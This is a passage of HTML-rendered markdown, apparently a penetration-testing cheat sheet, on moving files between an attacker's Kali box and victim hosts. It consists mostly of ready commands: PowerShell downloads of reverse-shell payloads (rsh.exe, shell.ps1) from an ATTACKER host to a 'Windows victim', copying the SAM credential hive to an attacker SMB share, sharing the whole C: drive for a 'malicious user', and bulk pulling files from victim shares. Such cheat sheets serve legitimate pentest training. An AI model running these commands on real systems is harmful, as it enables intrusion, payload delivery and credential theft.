class=\"pl-c1\"\u003e$\u003c/span\u003efilename\u003c/span\u003e = \u003cspan class=\"pl-en\"\u003ebasename\u003c/span\u003e(\u003cspan class=\"pl-s1\"\u003e\u003cspan class=\"pl-c1\"\u003e$\u003c/span\u003e\u003cspan class=\"pl-c1\"\u003e_FILES\u003c/span\u003e\u003c/span\u003e[\u003cspan class=\"pl-s\"\u003e'\u003cspan class=\"pl-s\"\u003efile\u003c/span\u003e'\u003c/span\u003e][\u003cspan class=\"pl-s\"\u003e'\u003cspan class=\"pl-s\"\u003ename\u003c/span\u003e'\u003c/span\u003e]);\n  \u003cspan class=\"pl-s1\"\u003e\u003cspan class=\"pl-c1\"\u003e$\u003c/span\u003euploadfile\u003c/span\u003e = \u003cspan class=\"pl-s1\"\u003e\u003cspan class=\"pl-c1\"\u003e$\u003c/span\u003euploaddir\u003c/span\u003e . \u003cspan class=\"pl-s1\"\u003e\u003cspan class=\"pl-c1\"\u003e$\u003c/span\u003efilename\u003c/span\u003e;\n  \u003cspan class=\"pl-en\"\u003emove_uploaded_file\u003c/span\u003e(\u003cspan class=\"pl-s1\"\u003e\u003cspan class=\"pl-c1\"\u003e$\u003c/span\u003e\u003cspan class=\"pl-c1\"\u003e_FILES\u003c/span\u003e\u003c/span\u003e[\u003cspan class=\"pl-s\"\u003e'\u003cspan class=\"pl-s\"\u003efile\u003c/span\u003e'\u003c/span\u003e][\u003cspan class=\"pl-s\"\u003e'\u003cspan class=\"pl-s\"\u003etmp_name\u003c/span\u003e'\u003c/span\u003e], \u003cspan class=\"pl-s1\"\u003e\u003cspan class=\"pl-c1\"\u003e$\u003c/span\u003euploadfile\u003c/span\u003e)\n\u003cspan class=\"pl-ent\"\u003e?\u0026gt;\u003c/span\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp dir=\"auto\"\u003eYou could also make Apache run it instead of standing up your own php server.\nChange the \u003ccode\u003e$uploaddir\u003c/code\u003e variable above to \u003ccode\u003e'/var/www/uploads'\u003c/code\u003e, and put the\n\u003ccode\u003eupload.php\u003c/code\u003e script in \u003ccode\u003e/var/www/cgi-bin\u003c/code\u003e. Requests will then point to\n\u003ccode\u003e/cgi-bin/upload.php\u003c/code\u003e instead of just \u003ccode\u003e/upload.php\u003c/code\u003e.\u003c/p\u003e\n\u003cp dir=\"auto\"\u003eStarting Apache server on Kali with necessary directories:\u003c/p\u003e\n\u003cdiv class=\"highlight highlight-source-shell notranslate position-relative overflow-auto\" dir=\"auto\" data-snippet-clipboard-copy-content=\"# make upload directory\nsudo mkdir -p /var/www/uploads\nsudo chown -R www-data:www-data /var/www/uploads\n# start server\nsudo systemctl restart apache2\"\u003e\u003cpre\u003e\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e make upload directory\u003c/span\u003e\nsudo mkdir -p /var/www/uploads\nsudo chown -R www-data:www-data /var/www/uploads\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e start server\u003c/span\u003e\nsudo systemctl restart apache2\u003c/pre\u003e\u003c/div\u003e\n\u003cp dir=\"auto\"\u003eUploading files from Windows using PowerShell:\u003c/p\u003e\n\u003cdiv class=\"highlight highlight-source-powershell notranslate position-relative overflow-auto\" dir=\"auto\" data-snippet-clipboard-copy-content=\"(New-Object System.Net.WebClient).UploadFile('http://LISTEN_IP/upload.php','somefiile')\"\u003e\u003cpre\u003e(\u003cspan class=\"pl-c1\"\u003eNew-Object\u003c/span\u003e System.Net.WebClient).UploadFile(\u003cspan class=\"pl-s\"\u003e\u003cspan class=\"pl-pds\"\u003e'\u003c/span\u003ehttp://LISTEN_IP/upload.php\u003cspan class=\"pl-pds\"\u003e'\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"pl-k\"\u003e,\u003c/span\u003e\u003cspan class=\"pl-s\"\u003e\u003cspan class=\"pl-pds\"\u003e'\u003c/span\u003esomefiile\u003cspan class=\"pl-pds\"\u003e'\u003c/span\u003e\u003c/span\u003e)\u003c/pre\u003e\u003c/div\u003e\n\u003cp dir=\"auto\"\u003eUploading files from Linux using curl:\u003c/p\u003e\n\u003cdiv class=\"highlight highlight-source-shell notranslate position-relative overflow-auto\" dir=\"auto\" data-snippet-clipboard-copy-content=\"curl -v http://LISTEN_IP/upload.php -F \u0026quot;file=@somefile\u0026quot;\"\u003e\u003cpre\u003ecurl -v http://LISTEN_IP/upload.php -F \u003cspan class=\"pl-s\"\u003e\u003cspan class=\"pl-pds\"\u003e\"\u003c/span\u003efile=@somefile\u003cspan class=\"pl-pds\"\u003e\"\u003c/span\u003e\u003c/span\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp dir=\"auto\"\u003eIf large files fail to upload properly, change the \u003ccode\u003ephp.ini\u003c/code\u003e or \u003ccode\u003e.user.ini\u003c/code\u003e settings:\u003c/p\u003e\n\u003cdiv class=\"highlight highlight-source-shell notranslate position-relative overflow-auto\" dir=\"auto\" data-snippet-clipboard-copy-content=\"# on kali, find and edit file\nlocate php.ini\nsudo vim /etc/php/7.4/apache2/php.ini\n# in php.ini, change the following:\n[php]\n# disable php memory limit\nmemory_limit = -1\n# make it 10GiB\nupload_max_filesize = 10G\n# make it unlimited\npost_max_size = 0\n# allow uploads to take 2 minutes\nmax_execution_time = 120\"\u003e\u003cpre\u003e\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e on kali, find and edit file\u003c/span\u003e\nlocate php.ini\nsudo vim /etc/php/7.4/apache2/php.ini\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e in php.ini, change the following:\u003c/span\u003e\n[php]\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e disable php memory limit\u003c/span\u003e\nmemory_limit = -1\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e make it 10GiB\u003c/span\u003e\nupload_max_filesize = 10G\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e make it unlimited\u003c/span\u003e\npost_max_size = 0\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e allow uploads to take 2 minutes\u003c/span\u003e\nmax_execution_time = 120\u003c/pre\u003e\u003c/div\u003e\n\u003cp dir=\"auto\"\u003e\u003cstrong\u003eNote:\u003c/strong\u003e The \u003ccode\u003e.user.ini\u003c/code\u003e file goes in your sites document root.\u003c/p\u003e\n\u003cdiv class=\"markdown-heading\" dir=\"auto\"\u003e\u003ch3 tabindex=\"-1\" class=\"heading-element\" dir=\"auto\"\u003e7.2.4 PowerShell File Transfers\u003c/h3\u003e\u003ca id=\"user-content-724-powershell-file-transfers\" class=\"anchor\" aria-label=\"Permalink: 7.2.4 PowerShell File Transfers\" href=\"#724-powershell-file-transfers\"\u003e\u003csvg class=\"octicon octicon-link\" viewBox=\"0 0 16 16\" version=\"1.1\" width=\"16\" height=\"16\" aria-hidden=\"true\"\u003e\u003cpath d=\"m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003e\u003c/div\u003e\n\u003cdiv class=\"highlight highlight-source-powershell notranslate position-relative overflow-auto\" dir=\"auto\" data-snippet-clipboard-copy-content=\"# Download to Windows victim\ninvoke-webrequest -uri http://ATTACKER/rsh.exe -out c:\\users\\public\\rsh.exe\n# For PowerShell version \u0026lt; 3.0\n(net.webclient).downloadstring(\u0026quot;http://ATTACKER/shell.ps1\u0026quot;) \u0026gt; c:\\users\\public\\shell.ps1\n(net.webclient).downloadfile(\u0026quot;http://ATTACKER/shell.ps1\u0026quot;, \u0026quot;c:\\users\\public\\shell.ps1\u0026quot;)\n\n# uploading a file:\n(New-Object System.Net.WebClient).UploadFile('http://LISTEN_IP/upload.php','somefiile')\"\u003e\u003cpre\u003e\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e Download to Windows victim\u003c/span\u003e\n\u003cspan class=\"pl-c1\"\u003einvoke-webrequest\u003c/span\u003e \u003cspan class=\"pl-k\"\u003e-\u003c/span\u003euri http:\u003cspan class=\"pl-k\"\u003e//\u003c/span\u003eATTACKER\u003cspan class=\"pl-k\"\u003e/\u003c/span\u003e\u003cspan class=\"pl-c1\"\u003ersh.exe\u003c/span\u003e \u003cspan class=\"pl-k\"\u003e-\u003c/span\u003eout c:\\users\\public\\\u003cspan class=\"pl-c1\"\u003ersh.exe\u003c/span\u003e\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e For PowerShell version \u0026lt; 3.0\u003c/span\u003e\n(net.webclient).downloadstring(\u003cspan class=\"pl-s\"\u003e\u003cspan class=\"pl-pds\"\u003e\"\u003c/span\u003ehttp://ATTACKER/shell.ps1\u003cspan class=\"pl-pds\"\u003e\"\u003c/span\u003e\u003c/span\u003e) \u003cspan class=\"pl-k\"\u003e\u0026gt;\u003c/span\u003e c:\\users\\public\\shell.ps1\n(net.webclient).downloadfile(\u003cspan class=\"pl-s\"\u003e\u003cspan class=\"pl-pds\"\u003e\"\u003c/span\u003ehttp://ATTACKER/shell.ps1\u003cspan class=\"pl-pds\"\u003e\"\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"pl-k\"\u003e,\u003c/span\u003e \u003cspan class=\"pl-s\"\u003e\u003cspan class=\"pl-pds\"\u003e\"\u003c/span\u003ec:\\users\\public\\shell.ps1\u003cspan class=\"pl-pds\"\u003e\"\u003c/span\u003e\u003c/span\u003e)\n\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e uploading a file:\u003c/span\u003e\n(\u003cspan class=\"pl-c1\"\u003eNew-Object\u003c/span\u003e System.Net.WebClient).UploadFile(\u003cspan class=\"pl-s\"\u003e\u003cspan class=\"pl-pds\"\u003e'\u003c/span\u003ehttp://LISTEN_IP/upload.php\u003cspan class=\"pl-pds\"\u003e'\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"pl-k\"\u003e,\u003c/span\u003e\u003cspan class=\"pl-s\"\u003e\u003cspan class=\"pl-pds\"\u003e'\u003c/span\u003esomefiile\u003cspan class=\"pl-pds\"\u003e'\u003c/span\u003e\u003c/span\u003e)\u003c/pre\u003e\u003c/div\u003e\n\u003cdiv class=\"markdown-heading\" dir=\"auto\"\u003e\u003ch3 tabindex=\"-1\" class=\"heading-element\" dir=\"auto\"\u003e7.2.5 Mount NFS Share\u003c/h3\u003e\u003ca id=\"user-content-725-mount-nfs-share\" class=\"anchor\" aria-label=\"Permalink: 7.2.5 Mount NFS Share\" href=\"#725-mount-nfs-share\"\u003e\u003csvg class=\"octicon octicon-link\" viewBox=\"0 0 16 16\" version=\"1.1\" width=\"16\" height=\"16\" aria-hidden=\"true\"\u003e\u003cpath d=\"m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003e\u003c/div\u003e\n\u003cdiv class=\"highlight highlight-source-shell notranslate position-relative overflow-auto\" dir=\"auto\" data-snippet-clipboard-copy-content=\"# try without vers=3 if mount fails. Also try with vers=2\nmount -t nfs -o vers=3 REMOTE_IP:/home/ /mnt/nfs-share\"\u003e\u003cpre\u003e\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e try without vers=3 if mount fails. Also try with vers=2\u003c/span\u003e\nmount -t nfs -o vers=3 REMOTE_IP:/home/ /mnt/nfs-share\u003c/pre\u003e\u003c/div\u003e\n\u003cdiv class=\"markdown-heading\" dir=\"auto\"\u003e\u003ch3 tabindex=\"-1\" class=\"heading-element\" dir=\"auto\"\u003e7.2.6 SMB Share\u003c/h3\u003e\u003ca id=\"user-content-726-smb-share\" class=\"anchor\" aria-label=\"Permalink: 7.2.6 SMB Share\" href=\"#726-smb-share\"\u003e\u003csvg class=\"octicon octicon-link\" viewBox=\"0 0 16 16\" version=\"1.1\" width=\"16\" height=\"16\" aria-hidden=\"true\"\u003e\u003cpath d=\"m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003e\u003c/div\u003e\n\u003cp dir=\"auto\"\u003eSharing entire \u003ccode\u003eC:/\u003c/code\u003e drive as SMB share for malicious user:\u003c/p\u003e\n\u003cdiv class=\"highlight highlight-source-batchfile notranslate position-relative overflow-auto\" dir=\"auto\" data-snippet-clipboard-copy-content=\"net share Cderp$=C:\\ /grant:derp,FULL /unlimited\"\u003e\u003cpre\u003e\u003cspan class=\"pl-k\"\u003enet share\u003c/span\u003e Cderp$=C:\\ /grant:derp,FULL /unlimited\u003c/pre\u003e\u003c/div\u003e\n\u003cp dir=\"auto\"\u003eMounting/hosting share on Kali\u003c/p\u003e\n\u003cdiv class=\"highlight highlight-source-shell notranslate position-relative overflow-auto\" dir=\"auto\" data-snippet-clipboard-copy-content=\"# mount foreign SMB share on Kali\nsudo mount -t cifs -o vers=1.0 //REMOTE_IP/'Sharename' /mnt/smbshare\n\n# host SMB share on kali (note: 'share' is share name)\nsudo impacket-smbserver -smb2support share .\n# to use for exfil: copy C:\\Windows\\Repair\\SAM \\\\KALI_IP\\share\\sam.save\n\n# To work with Windows 10+\nimpacket-smbserver -smb2support -user derp -password herpderp share .\n# to connect on Windows with creds:\n# net use \\\\ATTACKER_IP herpderp /user:derp\"\u003e\u003cpre\u003e\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e mount foreign SMB share on Kali\u003c/span\u003e\nsudo mount -t cifs -o vers=1.0 //REMOTE_IP/\u003cspan class=\"pl-s\"\u003e\u003cspan class=\"pl-pds\"\u003e'\u003c/span\u003eSharename\u003cspan class=\"pl-pds\"\u003e'\u003c/span\u003e\u003c/span\u003e /mnt/smbshare\n\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e host SMB share on kali (note: 'share' is share name)\u003c/span\u003e\nsudo impacket-smbserver -smb2support share \u003cspan class=\"pl-c1\"\u003e.\u003c/span\u003e\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e to use for exfil: copy C:\\Windows\\Repair\\SAM \\\\KALI_IP\\share\\sam.save\u003c/span\u003e\n\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e To work with Windows 10+\u003c/span\u003e\nimpacket-smbserver -smb2support -user derp -password herpderp share \u003cspan class=\"pl-c1\"\u003e.\u003c/span\u003e\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e to connect on Windows with creds:\u003c/span\u003e\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e net use \\\\ATTACKER_IP herpderp /user:derp\u003c/span\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp dir=\"auto\"\u003eUsing curl to upload file to windows SMB share\u003c/p\u003e\n\u003cdiv class=\"highlight highlight-source-shell notranslate position-relative overflow-auto\" dir=\"auto\" data-snippet-clipboard-copy-content=\"curl --upload-file /path/to/rsh.exe -u 'DOMAIN\\username' smb://$VICTIM_IP/c$/\"\u003e\u003cpre\u003ecurl --upload-file /path/to/rsh.exe -u \u003cspan class=\"pl-s\"\u003e\u003cspan class=\"pl-pds\"\u003e'\u003c/span\u003eDOMAIN\\username\u003cspan class=\"pl-pds\"\u003e'\u003c/span\u003e\u003c/span\u003e smb://\u003cspan class=\"pl-smi\"\u003e$VICTIM_IP\u003c/span\u003e/c$/\u003c/pre\u003e\u003c/div\u003e\n\u003cp dir=\"auto\"\u003eGet all files from SMB share with \u003ccode\u003esmbclient\u003c/code\u003e:\u003c/p\u003e\n\u003cdiv class=\"highlight highlight-source-shell notranslate position-relative overflow-auto\" dir=\"auto\" data-snippet-clipboard-copy-content=\"smbclient //$VICTIM_IP/SHARENAME\n\u0026gt; RECURSE ON\n\u0026gt; PROMPT OFF\n\u0026gt; mget *\"\u003e\u003cpre\u003esmbclient //\u003cspan class=\"pl-smi\"\u003e$VICTIM_IP\u003c/span\u003e/SHARENAME\n\u003cspan class=\"pl-k\"\u003e\u0026gt;\u003c/span\u003e RECURSE ON\n\u003cspan class=\"pl-k\"\u003e\u0026gt;\u003c/span\u003e PROMPT OFF\n\u003cspan class=\"pl-k\"\u003e\u0026gt;\u003c/span\u003e mget \u003cspan class=\"pl-k\"\u003e*\u003c/span\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cdiv class=\"markdown-heading\" dir=\"auto\"\u003e\u003ch3 tabindex=\"-1\" class=\"heading-element\" dir=\"auto\"\u003e7.2.7 FTP Server on Kali\u003c/h3\u003e\u003ca id=\"user-content-727-ftp-server-on-kali\" class=\"anchor\" aria-label=\"Permalink: 7.2.7 FTP Server on Kali\" href=\"#727-ftp-server-on-kali\"\u003e\u003csvg class=\"octicon octicon-link\" viewBox=\"0 0 16 16\" version=\"1.1\" width=\"16\" height=\"16\" aria-hidden=\"true\"\u003e\u003cpath d=\"m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003e\u003c/div\u003e\n\u003cdiv class=\"highlight highlight-source-shell notranslate position-relative overflow-auto\" dir=\"auto\" data-snippet-clipboard-copy-content=\"# install pyftpdlib for root to use port 21\nsudo pip install pyftpdlib\n# get usage help\npython3 -m pyftpdlib --help\n# start server on port 21, allowing anonymous write\nsudo python3 -m pyftpdlib -p 21 -w\n# start server on port 2121 for specific username/password\npython3 -m pyftpdlib -w -u derp -P herpderp\"\u003e\u003cpre\u003e\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e install pyftpdlib for root to use port 21\u003c/span\u003e\nsudo pip install pyftpdlib\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e get usage help\u003c/span\u003e\npython3 -m pyftpdlib --help\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e start server on port 21, allowing anonymous write\u003c/span\u003e\nsudo python3 -m pyftpdlib -p 21 -w\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e start server on port 2121 for specific username/password\u003c/span\u003e\npython3 -m pyftpdlib -w -u derp -P herpderp\u003c/pre\u003e\u003c/div\u003e\n\u003cp dir=\"auto\"\u003eThen on Windows box, create \u003ccode\u003eftpup.bat\u003c/code\u003e:\u003c/p\u003e\n\u003cdiv class=\"highlight highlight-source-batchfile notranslate position-relative overflow-auto\" dir=\"auto\" data-snippet-clipboard-copy-content=\"@echo off\n:: change server IP and Port as required\necho open LISTEN_IP 2121\u0026gt; ftpcmd.dat\necho user derp\u0026gt;\u0026gt; ftpcmd.dat\necho herpderp\u0026gt;\u0026gt; ftpcmd.dat\necho bin\u0026gt;\u0026gt; ftpcmd.dat\necho put %1\u0026gt;\u0026gt; ftpcmd.dat\necho quit\u0026gt;\u0026gt; ftpcmd.dat\nftp -n -s:ftpcmd.dat\ndel ftpcmd.dat\"\u003e\u003cpre\u003e\u003cspan class=\"pl-k\"\u003e@\u003c/span\u003e\u003cspan class=\"pl-k\"\u003eecho\u003c/span\u003e \u003cspan class=\"pl-k\"\u003eoff\u003c/span\u003e\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e::\u003c/span\u003e change server IP and Port as required\u003c/span\u003e\n\u003cspan class=\"pl-k\"\u003eecho\u003c/span\u003e open LISTEN_IP \u003cspan class=\"pl-c1\"\u003e2121\u003c/span\u003e\u003cspan class=\"pl-k\"\u003e\u0026gt;\u003c/span\u003e ftpcmd.dat\n\u003cspan class=\"pl-k\"\u003eecho\u003c/span\u003e user derp\u003cspan class=\"pl-k\"\u003e\u0026gt;\u0026gt;\u003c/span\u003e ftpcmd.dat\n\u003cspan class=\"pl-k\"\u003eecho\u003c/span\u003e herpderp\u003cspan class=\"pl-k\"\u003e\u0026gt;\u0026gt;\u003c/span\u003e ftpcmd.dat\n\u003cspan class=\"pl-k\"\u003eecho\u003c/span\u003e bin\u003cspan class=\"pl-k\"\u003e\u0026gt;\u0026gt;\u003c/span\u003e ftpcmd.dat\n\u003cspan class=\"pl-k\"\u003eecho\u003c/span\u003e put \u003cspan class=\"pl-v\"\u003e%1\u003c/span\u003e\u003cspan class=\"pl-k\"\u003e\u0026gt;\u0026gt;\u003c/span\u003e ftpcmd.dat\n\u003cspan class=\"pl-k\"\u003eecho\u003c/span\u003e quit\u003cspan class=\"pl-k\"\u003e\u0026gt;\u0026gt;\u003c/span\u003e ftpcmd.dat\n\u003cspan class=\"pl-k\"\u003eftp\u003c/span\u003e -n -s:ftpcmd.dat\n\u003cspan class=\"pl-k\"\u003edel\u003c/span\u003e ftpcmd.dat\u003c/pre\u003e\u003c/div\u003e\n\u003cp dir=\"auto\"\u003eAnd use like so:\u003c/p\u003e\n\u003cdiv class=\"highlight highlight-source-batchfile notranslate position-relative overflow-auto\" dir=\"auto\" data-snippet-clipboard-copy-content=\"ftpup.bat filetotxfer.txt\"\u003e\u003cpre\u003eftpup.bat filetotxfer.txt\u003c/pre\u003e\u003c/div\u003e\n\u003cp dir=\"auto\"\u003eNode.js ftps-server:\u003c/p\u003e\n\u003cdiv class=\"highlight highlight-source-shell notranslate position-relative overflow-auto\" dir=\"auto\" data-snippet-clipboard-copy-content=\"sudo npm install -g ftp-srv --save\nftp-srv ftp://0.0.0.0:2121 --root /tmp\"\u003e\u003cpre\u003esudo npm install -g ftp-srv --save\nftp-srv ftp://0.0.0.0:2121 --root /tmp\u003c/pre\u003e\u003c/div\u003e\n\u003cp dir=\"auto\"\u003ePure-FTP server:\u003c/p\u003e\n\u003cdiv class=\"highlight highlight-source-shell notranslate position-relative overflow-auto\" dir=\"auto\" data-snippet-clipboard-copy-content=\"# Install\nsudo apt update \u0026amp;\u0026amp; sudo apt install -y pure-ftp\n# Configure pure-ftp\ngroupadd ftpgroup\nuseradd -g ftpgroup -d /dev/null -s /usr/sbin/nologin ftpuser\npure-pwd useradd fusr -u ftpuser -d /ftphome\npure-pw mkdb\ncd /etc/pure-ftpd/auth/\nln -s ../conf/PureDB 60pdb\nmkdir -p /ftphome\nchown -R ftpuser:ftpgroup /ftphome/\n/etc/init.d/pure-ftpd restart\"\u003e\u003cpre\u003e\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e Install\u003c/span\u003e\nsudo apt update \u003cspan class=\"pl-k\"\u003e\u0026amp;\u0026amp;\u003c/span\u003e sudo apt install -y pure-ftp\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e Configure pure-ftp\u003c/span\u003e\ngroupadd ftpgroup\nuseradd -g ftpgroup -d /dev/null -s /usr/sbin/nologin ftpuser\npure-pwd useradd fusr -u ftpuser -d /ftphome\npure-pw mkdb\n\u003cspan class=\"pl-c1\"\u003ecd\u003c/span\u003e /etc/pure-ftpd/auth/\nln -s ../conf/PureDB 60pdb\nmkdir -p /ftphome\nchown -R ftpuser:ftpgroup /ftphome/\n/etc/init.d/pure-ftpd restart\u003c/pre\u003e\u003c/div\u003e\n\u003cdiv class=\"markdown-heading\" dir=\"auto\"\u003e\u003ch3 tabindex=\"-1\" class=\"heading-element\" dir=\"auto\"\u003e7.2.8 WebDAV\u003c/h3\u003e\u003ca id=\"user-content-728-webdav\" class=\"anchor\" aria-label=\"Permalink: 7.2.8 WebDAV\" href=\"#728-webdav\"\u003e\u003csvg class=\"octicon octicon-link\" viewBox=\"0 0 16 16\" version=\"1.1\" width=\"16\" height=\"16\" aria-hidden=\"true\"\u003e\u003cpath d=\"m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003e\u003c/div\u003e\n\u003cp dir=\"auto\"\u003eWe can host a WebDAV server on our Kali box for pushing/pulling files from other hosts, especially Windows machines using a Library file pointing to the WebDAV share.\u003c/p\u003e\n\u003cdiv class=\"highlight highlight-source-shell notranslate position-relative overflow-auto\" dir=\"auto\" data-snippet-clipboard-copy-content=\"# install wsgidav (WebDAV server)\npip3 install --user wsgidav\n\n# make a folder that we want to host publicly\nmkdir webdav\n\n# start the server with open access\nwsgidav --host=0.0.0.0 --port=80 --auth=anonymous --root webdav/\n# you can confirm this is running by going to http://127.0.0.1 in your browser\"\u003e\u003cpre\u003e\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e install wsgidav (WebDAV server)\u003c/span\u003e\npip3 install --user wsgidav\n\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e make a folder that we want to host publicly\u003c/span\u003e\nmkdir webdav\n\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e start the server with open access\u003c/span\u003e\nwsgidav --host=0.0.0.0 --port=80 --auth=anonymous --root webdav/\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e you can confirm this is running by going to http://127.0.0.1 in your browser\u003c/span\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cdiv class=\"markdown-heading\" dir=\"auto\"\u003e\u003ch3 tabindex=\"-1\" class=\"heading-element\" dir=\"auto\"\u003e7.2.9 SSHFS\u003c/h3\u003e\u003ca id=\"user-content-729-sshfs\" class=\"anchor\" aria-label=\"Permalink: 7.2.9 SSHFS\" href=\"#729-sshfs\"\u003e\u003csvg 